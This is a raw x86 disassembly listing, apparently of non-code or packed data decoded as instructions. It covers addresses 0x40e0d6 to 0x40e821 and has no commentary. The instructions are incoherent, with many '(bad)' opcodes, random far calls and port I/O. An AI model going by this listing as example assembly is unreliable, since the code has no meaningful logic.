  40e0d6:	bound  edx,QWORD PTR [edx+ebp*2+0x3a]
  40e0da:	aad    0x97
  40e0dc:	jns    0x40e15c
  40e0de:	in     al,dx
  40e0df:	inc    DWORD PTR [edi-0x78]
  40e0e2:	sub    al,0x8a
  40e0e4:	(bad)  
  40e0e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0e6:	dec    ecx
  40e0e7:	fld    QWORD PTR [edx-0x2c]
  40e0ea:	imul   esp,eax,0x498b5425
  40e0f0:	push   esi
  40e0f1:	jge    0x40e128
  40e0f3:	push   esp
  40e0f4:	fidivr WORD PTR [edx-0x7801343b]
  40e0fa:	sti    
  40e0fb:	dec    edi
  40e0fc:	cmp    dl,BYTE PTR [ebx]
  40e0fe:	daa    
  40e0ff:	fs mov ebp,0x1f192db6
  40e105:	push   edx
  40e106:	repz pop ecx
  40e108:	dec    edi
  40e109:	xchg   ebx,eax
  40e10a:	retf   
  40e10b:	push   ecx
  40e10c:	fcmovnbe st,st(5)
  40e10e:	hlt    
  40e10f:	rcr    BYTE PTR [ecx],1
  40e111:	test   eax,0x4ef35c58
  40e116:	fidiv  DWORD PTR [ebx+esi*1+0x36450834]
  40e11d:	push   esp
  40e11e:	push   ds
  40e11f:	push   esp
  40e120:	pop    eax
  40e121:	mov    eax,ds:0x2724edef
  40e126:	add    al,0xba
  40e128:	dec    edi
  40e129:	ret    
  40e12a:	stc    
  40e12b:	retf   
  40e12c:	fisttp DWORD PTR [ebx-0x3fd84804]
  40e132:	loopne 0x40e1a8
  40e134:	fdivr  st(3),st
  40e136:	mov    ch,0xe7
  40e138:	cmc    
  40e139:	xor    dh,dl
  40e13b:	sar    BYTE PTR [ebp+0x14],0xbe
  40e13f:	ret    
  40e140:	inc    edx
  40e141:	pusha  
  40e142:	shr    esp,1
  40e144:	pop    es
  40e145:	call   0x10ad8340
  40e14a:	pushf  
  40e14b:	rcr    DWORD PTR [ebx+0x45],1
  40e14e:	push   edi
  40e14f:	mov    ah,bl
  40e151:	out    0x7c,eax
  40e153:	xchg   ebx,eax
  40e154:	jl     0x40e16f
  40e156:	sbb    eax,0x95f71c05
  40e15b:	cmp    DWORD PTR [esi-0x16],edi
  40e15e:	xchg   DWORD PTR [ebx+0x54],ebx
  40e161:	push   0xeff85a86
  40e166:	in     al,0x60
  40e168:	dec    edi
  40e169:	fisttp WORD PTR [ecx-0x4e]
  40e16c:	push   esp
  40e16d:	cmp    ebp,esi
  40e16f:	das    
  40e170:	dec    esp
  40e171:	add    DWORD PTR [eax-0x11],ebp
  40e174:	pushf  
  40e175:	pop    ecx
  40e176:	pop    edx
  40e177:	jbe    0x40e18b
  40e179:	retf   0xee5a
  40e17c:	xchg   edx,eax
  40e17d:	(bad)  
  40e17e:	mov    dl,0xa0
  40e180:	jl     0x40e1cd
  40e182:	or     eax,0xb60a5acf
  40e187:	ja     0x40e13b
  40e189:	jae    0x40e1be
  40e18b:	pop    es
  40e18c:	rol    DWORD PTR [esi+0x5c99e4a],1
  40e192:	mov    cl,0x39
  40e194:	pop    ds
  40e195:	xlat   BYTE PTR ds:[ebx]
  40e196:	(bad)  
  40e197:	fbld   TBYTE PTR [edx]
  40e199:	inc    ebx
  40e19a:	repnz in al,0x47
  40e19d:	or     eax,0x6c41e066
  40e1a2:	mov    bh,0xa7
  40e1a4:	scas   eax,DWORD PTR es:[edi]
  40e1a5:	sub    al,0x38
  40e1a7:	dec    ebx
  40e1a8:	imul   eax
  40e1aa:	cdq    
  40e1ab:	les    ebx,FWORD PTR ds:0x3ab6b4e0
  40e1b1:	or     eax,0xf9b26b26
  40e1b6:	pop    eax
  40e1b7:	and    al,0xf
  40e1b9:	pop    edi
  40e1ba:	ins    DWORD PTR es:[edi],dx
  40e1bb:	pop    ss
  40e1bc:	data16 jno 0x40e1d3
  40e1bf:	pop    ebx
  40e1c0:	sub    ah,BYTE PTR [eax+0x73]
  40e1c3:	pop    ecx
  40e1c4:	mov    DWORD PTR [edx+0x2e],ebp
  40e1c7:	leave  
  40e1c8:	ins    DWORD PTR es:[edi],dx
  40e1c9:	scas   eax,DWORD PTR es:[edi]
  40e1ca:	neg    DWORD PTR [ebp+0x48fdbb4c]
  40e1d0:	mov    ecx,0xf954262e
  40e1d6:	jl     0x40e1a4
  40e1d8:	push   ebx
  40e1d9:	mov    dh,al
  40e1db:	add    eax,0x7814f1d6
  40e1e0:	outs   dx,WORD PTR ds:[esi]
  40e1e2:	fild   DWORD PTR [eax+ebp*1]
  40e1e5:	and    ebx,ebp
  40e1e7:	dec    edi
  40e1e8:	and    bh,BYTE PTR [edx]
  40e1ea:	mov    ds:0x125c62ae,eax
  40e1ef:	mov    ebx,0x2d3fb793
  40e1f4:	lahf   
  40e1f5:	out    0x15,eax
  40e1f7:	aaa    
  40e1f8:	test   BYTE PTR [eax+0x13],cl
  40e1fb:	(bad)
  40e200:	cld    
  40e201:	xchg   ebp,eax
  40e202:	xchg   esi,eax
  40e203:	out    dx,al
  40e204:	jb     0x40e258
  40e206:	iret   
  40e207:	es sbb al,0xe5
  40e20a:	data16 mov dl,0x6a
  40e20d:	adc    eax,0xd9b6db39
  40e212:	jp     0x40e21e
  40e214:	repnz leave 
  40e216:	in     al,0x13
  40e218:	pop    ds
  40e219:	dec    edx
  40e21a:	inc    edi
  40e21b:	push   cs
  40e21c:	mov    ch,0x9d
  40e21e:	sub    bh,al
  40e220:	cwde   
  40e221:	shr    ch,1
  40e223:	dec    edi
  40e224:	inc    ecx
  40e225:	or     al,0x69
  40e227:	sti    
  40e228:	lahf   
  40e229:	and    eax,0x93c6b196
  40e22e:	add    ecx,DWORD PTR [esp+edi*8+0xf0c7a72]
  40e235:	mov    eax,0xe7285b86
  40e23a:	sub    al,0xfe
  40e23c:	addr16 mov dh,0x83
  40e23f:	test   DWORD PTR [eax-0x36],esi
  40e242:	mov    edx,0xba3c1ecb
  40e247:	test   al,0x65
  40e249:	outs   dx,BYTE PTR ds:[esi]
  40e24a:	lods   eax,DWORD PTR ds:[esi]
  40e24b:	popf   
  40e24c:	lods   al,BYTE PTR ds:[esi]
  40e24d:	push   edx
  40e24e:	stc    
  40e24f:	mov    eax,0x1b5e4d85
  40e254:	loopne 0x40e287
  40e256:	hlt    
  40e257:	ret    0x3f74
  40e25a:	jne    0x40e208
  40e25c:	push   0x8023f17f
  40e261:	mov    ebx,0x2eb114ba
  40e266:	mov    DWORD PTR [eax+0x6fac7a00],esi
  40e26c:	dec    ecx
  40e26d:	imul   ebx,DWORD PTR [esi],0xffffffa7
  40e270:	dec    edi
  40e271:	rcr    BYTE PTR [esi-0x23bb190a],1
  40e277:	xchg   esi,eax
  40e278:	push   eax
  40e279:	adc    eax,0x46abe6b7
  40e27e:	mov    dh,0x3f
  40e280:	pop    ecx
  40e281:	mov    al,ds:0x9f7b9941
  40e286:	pop    ss
  40e287:	add    cl,BYTE PTR [esi-0x8]
  40e28a:	jns    0x40e21e
  40e28c:	mov    eax,0x504d3229
  40e291:	adc    bh,bl
  40e293:	dec    ebx
  40e294:	icebp  
  40e295:	cdq    
  40e296:	xchg   esi,eax
  40e297:	ret    
  40e298:	mov    esi,0x9d0eb985
  40e29d:	aad    0x1d
  40e29f:	rol    edi,0xd9
  40e2a2:	shl    DWORD PTR [esi+0x7b],cl
  40e2a5:	mov    ch,dh
  40e2a7:	cmp    ch,BYTE PTR [ecx+0x66]
  40e2aa:	push   esp
  40e2ab:	je     0x40e248
  40e2ad:	call   0x72a7:0xd6b7ae96
  40e2b4:	mov    esp,0xfcf8e474
  40e2b9:	and    eax,DWORD PTR [eax]
  40e2bb:	pop    edi
  40e2bc:	jmp    0x1148:0x1084545a
  40e2c3:	dec    ebp
  40e2c4:	mov    cl,0x94
  40e2c6:	mov    ebp,0x24dfabad
  40e2cb:	pushf  
  40e2cc:	out    dx,eax
  40e2cd:	push   edx
  40e2ce:	sbb    BYTE PTR [esi+eax*2-0x621b19a2],dh
  40e2d5:	test   DWORD PTR [esi],edi
  40e2d7:	sbb    BYTE PTR [edi],0x73
  40e2da:	aam    0x14
  40e2dc:	cmp    ebx,ebx
  40e2de:	sbb    eax,0xe335ebef
  40e2e3:	repz fstp QWORD PTR [ebx+0x6a]
  40e2e7:	add    al,dl
  40e2e9:	jmp    0x4fec:0x8979e971
  40e2f0:	fst    DWORD PTR [eax]
  40e2f2:	lds    edi,FWORD PTR [edi+eiz*4]
  40e2f5:	or     ah,dh
  40e2f7:	push   ds
  40e2f8:	out    0x3d,eax
  40e2fa:	pop    ss
  40e2fb:	pusha  
  40e2fc:	je     0x40e2b2
  40e2fe:	data16 fsub QWORD PTR [ebx+edx*8+0x18]
  40e303:	push   edi
  40e304:	xchg   ecx,eax
  40e305:	add    DWORD PTR [ebp+0x17],ebp
  40e308:	inc    edi
  40e309:	cld    
  40e30a:	and    bl,BYTE PTR ds:0x22c70059
  40e310:	cmp    al,BYTE PTR [ecx]
  40e312:	pop    ebp
  40e313:	or     DWORD PTR [edx-0xd8a7e4d],edx
  40e319:	push   ebp
  40e31a:	mov    BYTE PTR [ecx+0xfaaefc6],bl
  40e320:	lock out dx,eax
  40e322:	pushf  
  40e323:	sahf   
  40e324:	add    DWORD PTR [ecx+0x3e],ebx
  40e327:	aaa    
  40e328:	fld    QWORD PTR [ebx]
  40e32a:	cmp    eax,0x8555d122
  40e32f:	icebp  
  40e330:	out    dx,eax
  40e331:	fistp  QWORD PTR ds:0x3dc7aeb7
  40e337:	sbb    DWORD PTR [ebp-0x31],esi
  40e33a:	push   es
  40e33b:	ins    BYTE PTR es:[edi],dx
  40e33c:	pushf  
  40e33d:	push   es
  40e33e:	and    eax,0xe72a963e
  40e343:	push   0xc3c36fd9
  40e348:	shl    bh,cl
  40e34a:	in     al,dx
  40e34b:	std    
  40e34c:	aad    0x86
  40e34e:	(bad)  
  40e34f:	jbe    0x40e384
  40e351:	dec    esi
  40e352:	(bad)  
  40e353:	mov    eax,0x1a74b78d
  40e358:	test   DWORD PTR [ebp+eiz*1+0x5caf5ebf],edi
  40e35f:	ins    BYTE PTR es:[edi],dx
  40e360:	push   eax
  40e361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e362:	mov    dl,0x71
  40e364:	sbb    esp,DWORD PTR gs:[edi-0x56]
  40e368:	fdiv   QWORD PTR [esi+ebx*4]
  40e36b:	ret    
  40e36c:	sub    al,0x5c
  40e36e:	adc    esp,DWORD PTR [ecx+ecx*8+0x227524e7]
  40e375:	mov    al,ds:0xab3611c3
  40e37a:	mul    bl
  40e37c:	xchg   edi,eax
  40e37d:	jge    0x40e34a
  40e37f:	xchg   ecx,eax
  40e380:	mov    eax,ds:0x158440fe
  40e385:	not    BYTE PTR [ebp+0x7b44d7f]
  40e38b:	jp     0x40e3a3
  40e38d:	arpl   WORD PTR [ecx],bx
  40e38f:	rcr    DWORD PTR [edx+edi*4-0x2e79340c],1
  40e396:	imul   edi,DWORD PTR [ebx-0x64e79c7a],0x51
  40e39d:	stc    
  40e39e:	xchg   ebp,eax
  40e39f:	push   ebx
  40e3a0:	push   ecx
  40e3a1:	fmulp  st(5),st
  40e3a3:	(bad)  
  40e3a4:	test   eax,0xdaa072a5
  40e3a9:	mov    ds:0x24eab4b,eax
  40e3ae:	push   eax
  40e3af:	dec    ebx
  40e3b0:	dec    edi
  40e3b1:	lods   al,BYTE PTR ds:[esi]
  40e3b2:	dec    esi
  40e3b3:	dec    edi
  40e3b4:	push   ds
  40e3b5:	xchg   esi,eax
  40e3b6:	add    eax,0x36208720
  40e3bb:	aam    0xeb
  40e3bd:	push   cs
  40e3be:	imul   ebp,DWORD PTR [edx+ecx*8+0x2f],0xe4ffa7a2
  40e3c6:	push   edi
  40e3c7:	into   
  40e3c8:	mov    esi,0xc3b5ff2f
  40e3cd:	(bad)  
  40e3ce:	rol    BYTE PTR [esi],1
  40e3d0:	xchg   ebx,eax
  40e3d1:	in     al,dx
  40e3d2:	or     eax,0xb3483d94
  40e3d7:	and    eax,esi
  40e3d9:	call   0xb1ec:0x991cd2fa
  40e3e0:	mov    ds:0x8b49deaf,eax
  40e3e5:	inc    edx
  40e3e6:	xor    dh,dh
  40e3e8:	push   cs
  40e3e9:	cs jg  0x40e432
  40e3ec:	test   al,0x7a
  40e3ee:	or     BYTE PTR [ecx+0x61],bh
  40e3f1:	ins    BYTE PTR es:[edi],dx
  40e3f2:	sahf   
  40e3f3:	mov    gs:0x4b183ef7,eax
  40e3f9:	push   0xec60b839
  40e3fe:	add    BYTE PTR [esi],al
  40e400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e401:	mov    ds:0x77f74429,eax
  40e406:	cli    
  40e407:	dec    ecx
  40e408:	cld    
  40e409:	xor    eax,0x3a7cef35
  40e40e:	pop    edi
  40e40f:	stos   DWORD PTR es:[edi],eax
  40e410:	stos   BYTE PTR es:[edi],al
  40e411:	dec    ecx
  40e412:	pop    ebp
  40e413:	xchg   ebx,eax
  40e414:	or     eax,DWORD PTR [esi]
  40e416:	cmp    dl,BYTE PTR [edi]
  40e418:	cmp    DWORD PTR ds:[ecx],esp
  40e41b:	call   FWORD PTR [edi]
  40e41d:	xchg   esi,eax
  40e41e:	adc    al,0x11
  40e420:	in     eax,0xce
  40e422:	nop
  40e423:	pop    ss
  40e424:	cmp    al,0xad
  40e426:	pop    esp
  40e427:	das    
  40e428:	popf   
  40e429:	das    
  40e42a:	dec    esi
  40e42b:	sbb    eax,0x20de96db
  40e430:	add    BYTE PTR [esi],0x2c
  40e433:	jmp    0xeffa116a
  40e438:	mov    al,ds:0x683b39ea
  40e43d:	jnp    0x40e42e
  40e43f:	xchg   ecx,eax
  40e440:	imul   esp,DWORD PTR [ebx+0x3a],0x18b3a242
  40e447:	adc    eax,0xea4993a
  40e44c:	push   ecx
  40e44d:	jle    0x40e401
  40e44f:	jmp    0x40e4a7
  40e451:	clc    
  40e452:	je     0x40e443
  40e454:	jl     0x40e4a1
  40e456:	les    esp,FWORD PTR [ecx]
  40e458:	hlt    
  40e459:	(bad)  
  40e45a:	adc    al,0xb4
  40e45c:	test   DWORD PTR [esi],edi
  40e45e:	(bad)  
  40e45f:	lea    eax,[ebx]
  40e461:	jb     0x40e4b9
  40e463:	jb     0x40e4c0
  40e465:	leave  
  40e466:	out    dx,eax
  40e467:	xor    al,0x51
  40e469:	pop    esp
  40e46a:	pop    ecx
  40e46b:	dec    ecx
  40e46c:	rol    BYTE PTR [ebx-0x3dca79e2],cl
  40e472:	dec    esp
  40e473:	push   cs
  40e474:	call   0xea6fa076
  40e479:	mov    bh,0xac
  40e47b:	jp     0x40e449
  40e47d:	xlat   BYTE PTR ds:[ebx]
  40e47e:	xor    eax,0xe6051ed7
  40e483:	cmp    BYTE PTR [edi+ecx*8-0x34773189],bl
  40e48a:	pop    ds
  40e48b:	dec    ebp
  40e48c:	adc    dh,bh
  40e48e:	push   ecx
  40e48f:	clc    
  40e490:	sahf   
  40e491:	inc    ecx
  40e492:	push   ebp
  40e493:	stos   BYTE PTR es:[edi],al
  40e494:	push   0xffffffbc
  40e496:	lods   al,BYTE PTR ds:[esi]
  40e497:	into   
  40e498:	sahf   
  40e499:	fdivrp st(2),st
  40e49b:	pop    ebx
  40e49c:	jne    0x40e4f8
  40e49e:	cs je  0x40e460
  40e4a1:	shr    ebp,1
  40e4a3:	sub    ebp,DWORD PTR cs:[ebp-0x2ff9d7eb]
  40e4aa:	mov    eax,DWORD PTR [ebx]
  40e4ac:	push   esp
  40e4ad:	mov    al,0xd9
  40e4af:	mov    cl,0xa8
  40e4b1:	adc    ebp,DWORD PTR [edi-0x44]
  40e4b4:	or     BYTE PTR [edi],ah
  40e4b6:	in     al,0x73
  40e4b8:	faddp  st(3),st
  40e4ba:	xor    BYTE PTR [eax+ebx*4+0x55],cl
  40e4be:	jbe    0x40e465
  40e4c0:	test   DWORD PTR [eax-0x6],edi
  40e4c3:	jmp    0x40e53b
  40e4c5:	test   DWORD PTR [ebx+0x2235c499],0x5eb68c82
  40e4cf:	xchg   esp,eax
  40e4d0:	push   esp
  40e4d1:	jmp    0x811708d9
  40e4d6:	popa   
  40e4d7:	(bad)  
  40e4d8:	aaa    
  40e4d9:	push   ebx
  40e4da:	dec    edx
  40e4db:	push   ebp
  40e4dc:	mov    al,0x55
  40e4de:	enter  0x5cce,0x15
  40e4e2:	popf   
  40e4e3:	push   esp
  40e4e4:	push   cs
  40e4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e6:	pusha  
  40e4e7:	sub    DWORD PTR [esi+0x6e],0x91c98bff
  40e4ee:	fsubr  st(1),st
  40e4f0:	pop    edi
  40e4f1:	sbb    DWORD PTR [edx-0x68],ebp
  40e4f4:	lods   eax,DWORD PTR ds:[esi]
  40e4f5:	mov    dl,0x67
  40e4f7:	fdiv   DWORD PTR ds:0xb86ba93b
  40e4fd:	push   edx
  40e4fe:	xor    esi,DWORD PTR [eax+0x15e06466]
  40e504:	xchg   ecx,eax
  40e505:	arpl   WORD PTR [edi],si
  40e507:	ds ins BYTE PTR es:[edi],dx
  40e509:	mov    ds:0xc2d322f2,al
  40e50e:	dec    edx
  40e50f:	test   BYTE PTR [ebx+0x5d],ah
  40e512:	imul   edi,DWORD PTR [edx],0x4776acd3
  40e518:	outs   dx,BYTE PTR ds:[esi]
  40e519:	xor    BYTE PTR [eax+0x52],bh
  40e51c:	mov    edx,0xcbbe14c5
  40e521:	push   esp
  40e522:	das    
  40e523:	jnp    0x40e537
  40e525:	cdq    
  40e526:	pop    ebp
  40e527:	test   BYTE PTR [esi],cl
  40e529:	pop    es
  40e52a:	mov    ecx,ecx
  40e52c:	dec    edi
  40e52d:	inc    ecx
  40e52e:	cwde   
  40e52f:	add    DWORD PTR cs:[esi-0x5],0x70fe480
  40e537:	adc    BYTE PTR [edi*2+0x4b13be0a],cl
  40e53e:	call   0xf7d:0xa656b92
  40e545:	mov    dl,0xab
  40e547:	add    al,0x81
  40e549:	bound  esi,QWORD PTR [esi+0x3c]
  40e54c:	aas    
  40e54d:	cmp    al,0xea
  40e54f:	add    BYTE PTR [ebx+0x8],0x7e
  40e553:	shl    DWORD PTR [esp+ecx*2+0x1189dc0c],1
  40e55a:	pushf  
  40e55b:	pop    eax
  40e55c:	sub    al,0xef
  40e55e:	popf   
  40e55f:	jp     0x40e5b4
  40e561:	fisub  WORD PTR [edi]
  40e563:	cmp    DWORD PTR [ecx-0x2d9e96b3],0x7d
  40e56a:	sub    BYTE PTR [ecx+eax*2+0x6f934c2a],bh
  40e571:	pop    es
  40e572:	mov    fs,WORD PTR [esi]
  40e574:	cmp    edx,DWORD PTR [esi-0x66d93772]
  40e57a:	push   eax
  40e57b:	xchg   ebp,eax
  40e57c:	adc    DWORD PTR [esi+0x38],ebx
  40e57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e580:	inc    ecx
  40e581:	mov    ds:0x97c6d391,eax
  40e586:	outs   dx,BYTE PTR ds:[esi]
  40e587:	or     dh,BYTE PTR [ebp+0x2e]
  40e58a:	jp     0x40e59c
  40e58c:	push   edi
  40e58d:	add    eax,0xb5277921
  40e592:	mov    esp,0x48734600
  40e597:	pop    ebp
  40e598:	xor    DWORD PTR [ecx+ebx*8+0x42],eax
  40e59c:	ja     0x40e5a5
  40e59e:	js     0x40e526
  40e5a0:	mov    al,ds:0x25e8192c
  40e5a5:	pop    esp
  40e5a6:	mov    ebp,0xbe71184e
  40e5ab:	jecxz  0x40e555
  40e5ad:	out    0x1c,al
  40e5af:	or     BYTE PTR [edx-0x51],dh
  40e5b2:	dec    ebp
  40e5b3:	test   DWORD PTR [ecx],ecx
  40e5b5:	ja     0x40e571
  40e5b7:	mov    ah,BYTE PTR [edx+0x64577c62]
  40e5bd:	inc    esi
  40e5be:	rcl    DWORD PTR [ebx],0x9
  40e5c1:	jp     0x40e58d
  40e5c3:	or     BYTE PTR [ebx+0x1],0xac
  40e5c7:	xchg   ecx,eax
  40e5c8:	pop    ss
  40e5c9:	into   
  40e5ca:	bound  ecx,QWORD PTR [ebx-0x10517f0c]
  40e5d0:	mov    dh,0xac
  40e5d2:	(bad)  
  40e5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5d4:	aam    0xf6
  40e5d6:	or     DWORD PTR [esi*2+0x1c817f5a],esi
  40e5dd:	push   0xa20ed3c5
  40e5e2:	repnz mov edi,0x43cf2e93
  40e5e8:	jne    0x40e5ca
  40e5ea:	adc    DWORD PTR [edi-0x3a125498],esp
  40e5f0:	inc    esi
  40e5f1:	addr16 cmp al,bh
  40e5f4:	sub    edx,edi
  40e5f6:	mov    dh,0xf4
  40e5f8:	or     esp,edi
  40e5fa:	aaa    
  40e5fb:	out    dx,al
  40e5fc:	and    bl,dl
  40e5fe:	imul   esp,DWORD PTR [edi+0x7a],0x1d
  40e602:	mov    esi,0x8c0c449
  40e607:	inc    eax
  40e608:	mov    esi,0x741fc69d
  40e60d:	push   ecx
  40e60e:	push   ds
  40e60f:	iret   
  40e610:	mov    edx,0x54eecec9
  40e615:	inc    ecx
  40e616:	call   0xaffa:0x2df7ea4b
  40e61d:	add    DWORD PTR [edi],eax
  40e61f:	arpl   WORD PTR [ebx],si
  40e621:	scas   eax,DWORD PTR es:[edi]
  40e622:	not    bl
  40e624:	jnp    0x40e632
  40e626:	push   ds
  40e627:	lea    eax,[edx-0x59]
  40e62a:	mov    edi,0x82af0f72
  40e62f:	xchg   edi,eax
  40e630:	dec    ebx
  40e631:	jbe    0x40e61e
  40e633:	pop    ss
  40e634:	fmul   QWORD PTR [ecx+ecx*1+0x15b0afe3]
  40e63b:	shl    DWORD PTR [ebx],0x9d
  40e63e:	stos   BYTE PTR es:[edi],al
  40e63f:	xchg   edx,ebp
  40e641:	adc    BYTE PTR [edi+0x386f269],ah
  40e647:	sbb    edx,edi
  40e649:	or     eax,ecx
  40e64b:	loopne 0x40e642
  40e64d:	adc    cl,BYTE PTR [ebx]
  40e64f:	ja     0x40e6c6
  40e651:	out    0xd2,ax
  40e654:	fdivr  DWORD PTR [esi+edi*4]
  40e657:	add    eax,0xeb86cc5
  40e65c:	pop    ss
  40e65d:	sbb    ch,dh
  40e65f:	sub    eax,0x3532792e
  40e664:	sbb    al,0xf9
  40e666:	cmp    ah,BYTE PTR [edi+0x6bd49b24]
  40e66c:	adc    dl,BYTE PTR [ecx]
  40e66e:	cmp    al,0x86
  40e670:	dec    ebp
  40e671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e672:	ins    DWORD PTR es:[edi],dx
  40e673:	cmp    bl,BYTE PTR [ebx]
  40e675:	ffreep st(3)
  40e677:	in     al,dx
  40e678:	or     al,0xc3
  40e67a:	or     DWORD PTR [eax+0x3d],esi
  40e67d:	push   ss
  40e67e:	add    eax,0x4d409235
  40e683:	dec    ecx
  40e684:	inc    ax
  40e686:	inc    edx
  40e687:	adc    ecx,esp
  40e689:	mov    dh,0x28
  40e68b:	xchg   esi,eax
  40e68c:	inc    ebx
  40e68d:	pusha  
  40e68e:	add    esi,DWORD PTR [edx-0x30]
  40e691:	retf   0x41bc
  40e694:	aas    
  40e695:	mov    ebp,0x87f37abd
  40e69a:	pop    ebx
  40e69b:	outs   dx,BYTE PTR ds:[esi]
  40e69c:	push   ebp
  40e69d:	(bad)  
  40e69e:	outs   dx,BYTE PTR ds:[esi]
  40e69f:	mov    ebx,0xd5894ca9
  40e6a4:	and    esi,ebx
  40e6a6:	inc    ebp
  40e6a7:	mov    al,BYTE PTR [ecx]
  40e6a9:	sahf   
  40e6aa:	js     0x40e6c6
  40e6ac:	jp     0x40e648
  40e6ae:	outs   dx,DWORD PTR ds:[esi]
  40e6af:	fsubp  st(1),st
  40e6b1:	mov    ebp,0x48dd3352
  40e6b6:	sbb    eax,0xcfd410a1
  40e6bb:	adc    BYTE PTR [ebp+ebx*4+0x64],al
  40e6bf:	sar    ah,0x72
  40e6c2:	mov    ebp,0xc1cd1c98
  40e6c7:	lods   al,BYTE PTR ds:[esi]
  40e6c8:	mov    cl,bl
  40e6ca:	and    al,0x5e
  40e6cc:	mov    edx,0x1629f2af
  40e6d1:	mov    esi,0x9372a8cd
  40e6d6:	stc    
  40e6d7:	push   0x3ff9e6cf
  40e6dc:	dec    esi
  40e6dd:	mov    dh,0xf0
  40e6df:	mov    eax,0x747e8cbc
  40e6e4:	sbb    BYTE PTR [edx],dh
  40e6e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6e7:	dec    ecx
  40e6e8:	or     eax,0xb7523848
  40e6ed:	fs push ebp
  40e6ef:	in     al,dx
  40e6f0:	scas   eax,DWORD PTR es:[edi]
  40e6f1:	dec    esi
  40e6f2:	aad    0x2
  40e6f4:	cmp    BYTE PTR [ecx+0x20],dh
  40e6f7:	rol    DWORD PTR [esp+ebp*2],0xcf
  40e6fb:	lods   eax,DWORD PTR ds:[esi]
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	(bad)  [ecx]
  40e6ff:	mov    esi,esp
  40e701:	jmp    0xb3b4:0xdd693832
  40e708:	xor    dh,BYTE PTR [ebx+0x24]
  40e70b:	les    edi,FWORD PTR ds:0x1cc96793
  40e711:	mov    esi,0xab189ec1
  40e716:	and    BYTE PTR [edi+0x6a],dl
  40e719:	bound  esp,QWORD PTR gs:[edi+edi*2]
  40e71d:	rcl    ecx,0x7d
  40e720:	jae    0x40e6a2
  40e722:	mov    WORD PTR [ebp-0x3b],ss
  40e725:	rcr    bl,cl
  40e727:	outs   dx,DWORD PTR ds:[esi]
  40e728:	out    dx,eax
  40e729:	cmp    cl,ah
  40e72b:	ins    DWORD PTR es:[edi],dx
  40e72c:	and    DWORD PTR [esi],0xef4d1ccb
  40e732:	adc    cl,cl
  40e734:	mov    esi,0x3aa68e8b
  40e739:	push   ebx
  40e73a:	mov    edx,0x39f835e7
  40e73f:	(bad)  
  40e740:	(bad)  
  40e741:	dec    DWORD PTR [ebp-0x4b]
  40e744:	ror    DWORD PTR [ebx-0x509837eb],1
  40e74a:	scas   al,BYTE PTR es:[edi]
  40e74b:	cmc    
  40e74c:	inc    ebp
  40e74d:	nop
  40e74e:	mov    eax,ebp
  40e750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e751:	lds    ebp,FWORD PTR [ebp-0x5ec935ca]
  40e757:	or     ebx,ecx
  40e759:	xor    al,0x2
  40e75b:	arpl   WORD PTR [eax],ax
  40e75d:	mov    ah,al
  40e75f:	fnstsw WORD PTR [edx+eax*1+0x5a]
  40e763:	dec    eax
  40e764:	in     eax,0x1
  40e766:	mov    ebx,0xb37453b0
  40e76b:	and    BYTE PTR gs:[ebp-0x56],bh
  40e76f:	push   0x62
  40e771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e772:	test   dh,al
  40e774:	out    0x28,eax
  40e776:	mov    BYTE PTR [edi],al
  40e778:	pop    eax
  40e779:	xchg   DWORD PTR [eax+0x47],ecx
  40e77c:	call   0x15e68ee4
  40e781:	cs mov al,0x5b
  40e784:	aam    0x49
  40e786:	mov    fs,eax
  40e788:	push   cs
  40e789:	jno    0x40e802
  40e78b:	jo     0x40e7c5
  40e78d:	mov    ebp,0x7a0cc70e
  40e792:	mov    ebp,0xf1941e1c
  40e797:	pop    edi
  40e798:	add    bl,dh
  40e79a:	ins    BYTE PTR es:[edi],dx
  40e79b:	cmp    al,0x88
  40e79d:	pusha  
  40e79e:	repnz dec edx
  40e7a0:	loop   0x40e7f4
  40e7a2:	xlat   BYTE PTR ds:[ebx]
  40e7a3:	lea    ebx,[ecx-0x1d]
  40e7a6:	retf   
  40e7a7:	inc    ecx
  40e7a8:	and    dl,BYTE PTR [eax-0x3509d08d]
  40e7ae:	pop    edi
  40e7af:	adc    DWORD PTR [eax+0x78],esi
  40e7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b3:	pop    ebp
  40e7b4:	pop    eax
  40e7b5:	in     eax,dx
  40e7b6:	sahf   
  40e7b7:	pop    ebp
  40e7b8:	lea    edi,cs:[ecx+0x4b]
  40e7bc:	out    0xd5,al
  40e7be:	mov    al,0x21
  40e7c0:	jecxz  0x40e7e3
  40e7c2:	adc    al,0x37
  40e7c4:	inc    edi
  40e7c5:	xchg   esp,eax
  40e7c6:	lods   al,BYTE PTR ds:[esi]
  40e7c7:	data16 or ch,BYTE PTR [edx-0x54]
  40e7cb:	ss fs je 0x40e829
  40e7cf:	mov    DWORD PTR [esi+0x7b08a599],ecx
  40e7d5:	push   edx
  40e7d6:	sbb    eax,0x583fa30e
  40e7db:	cmp    DWORD PTR [eax+ebp*2-0x4034cc7a],eax
  40e7e2:	cmp    edx,DWORD PTR cs:[ebx+0x16c18d6a]
  40e7e9:	mov    eax,ds:0xd01bbbe7
  40e7ee:	cs enter 0xe59c,0x66
  40e7f3:	retf   
  40e7f4:	and    BYTE PTR [eax-0x58],0xc4
  40e7f8:	mov    edi,DWORD PTR [ebx-0x3]
  40e7fb:	pop    esp
  40e7fc:	ror    BYTE PTR ds:0x2ba8b838,0xdb
  40e803:	out    dx,al
  40e804:	imul   esi,DWORD PTR [edx],0x64
  40e807:	pop    eax
  40e808:	xor    DWORD PTR [ecx+0x21b93233],0x6a
  40e80f:	adc    eax,0xd891b61d
  40e814:	pop    ebx
  40e815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e816:	aaa    
  40e817:	faddp  st(1),st
  40e819:	xchg   BYTE PTR [edi-0x14],al
  40e81c:	fwait
  40e81d:	shl    edi,cl
  40e81f:	outs   dx,DWORD PTR ds:[esi]
  40e820:	daa    
  40e821:	mov    edx,0xa453a832
